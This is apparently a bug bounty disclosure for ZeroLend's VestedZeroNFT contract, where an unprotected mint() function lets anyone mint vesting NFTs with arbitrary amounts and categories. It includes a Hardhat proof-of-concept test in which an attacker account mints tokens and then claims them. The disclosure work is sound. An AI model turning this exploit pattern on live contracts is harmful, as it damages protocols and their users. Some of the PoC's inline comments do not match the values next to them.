# 28875 - \[SC - Medium] Unauthorized minting of vested NFTs

Submitted on Feb 29th 2024 at 16:43:28 UTC by @riptide for [Boost | ZeroLend](https://immunefi.com/bounty/zerolend-boost/)

Report ID: #28875

Report type: Smart Contract

Report severity: Medium

Target: <https://github.com/zerolend/governance>

Impacts:

* Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

`VestedZeroNFT` contract lacks a permissioned modifer for `mint()` on `L63` which allows any user to mint an unlimited amount of `VestedZeroNFTs` to any address with falsified categories.

## Vulnerability Details

Lack of permissioned modifier to a function explicitly specified as protected in the comments.

## Impact Details

Low impact other than misrepresenting the `VestCategory` at will and corrupting any analytics when viewing the collection and stats of the vested NFTs (amounts, cliff times, linear, etc all can be arbitrarily set).

## References

Add any relevant links to documentation or code

## Proof of concept

```
import { expect } from "chai";
import { deployGovernance } from "./fixtures/governance";
import { loadFixture, time } from "@nomicfoundation/hardhat-network-helpers";
import { SignerWithAddress } from "@nomicfoundation/hardhat-ethers/signers";
import { VestedZeroNFT } from "../typechain-types";
import { e18 } from "./fixtures/utils";
const { ethers } = require("hardhat");

describe.only("VestedZeroNFT", () => {
  let ant: SignerWithAddress;
  let vest: VestedZeroNFT;
  let now: number;

  beforeEach(async () => {
    const deployment = await loadFixture(deployGovernance);
    ant = deployment.ant;
    vest = deployment.vestedZeroNFT;
    now = Math.floor(Date.now() / 1000);

  });

  describe("unprotected mint function", () => {

    it("anyone can mint an NFT with any vesting parameters", async function () {
      const [attacker] = await ethers.getSigners();
      await vest.connect(attacker).mint(
        ant.address,
        e18 * 15n, // 15 ZERO linear vesting
        e18 * 5n, // 5 ZERO upfront
        1, // linear duration
        0, // cliff duration - 500 seconds
        now + 1000, // unlock date
        false, // penalty -> false
        0
      );
      expect(await vest.balanceOf(ant)).to.equal(1);
      expect(await vest.ownerOf(1)).to.equal(ant.address);
      expect(await vest.tokenOfOwnerByIndex(ant.address, 0)).to.equal(1);

      await time.increaseTo(now + 1001);
      const res = await vest.claimable(1);
      console.log("unlock date: ", now + 1000);
      console.log(res);
      expect(res.upfront).to.equal(e18 * 5n);
      expect(res.pending).to.equal(e18 * 15n);

      expect(await vest.claim.staticCall(1)).to.eq(e18 * 20n);
      await vest.claim(1);
      expect(await vest.claimed(1)).to.equal(e18 * 20n);
      expect(await vest.unclaimed(1)).to.equal(0);
    });

    
    it("anyone can mint an NFT with zero value", async function () {
      const [attacker] = await ethers.getSigners();
      await vest.connect(attacker).mint(
        ant.address,
        0, // 15 ZERO linear vesting
        0, // 5 ZERO upfront
        1, // linear duration
        500, // cliff duration - 500 seconds
        now + 1000, // unlock date
        false, // penalty -> false
        0
      );

    });

    it("anyone can mint an NFT with incorrect categorization", async function () {
      const [attacker] = await ethers.getSigners();
      await vest.connect(attacker).mint(
        ant.address,
        e18 * 15n, // 15 ZERO linear vesting
        e18 * 5n, // 5 ZERO upfront
        1, // linear duration
        0, // cliff duration - 500 seconds
        now + 1000, // unlock date
        false, // penalty -> false
        1
      );
    });


  });
});
```
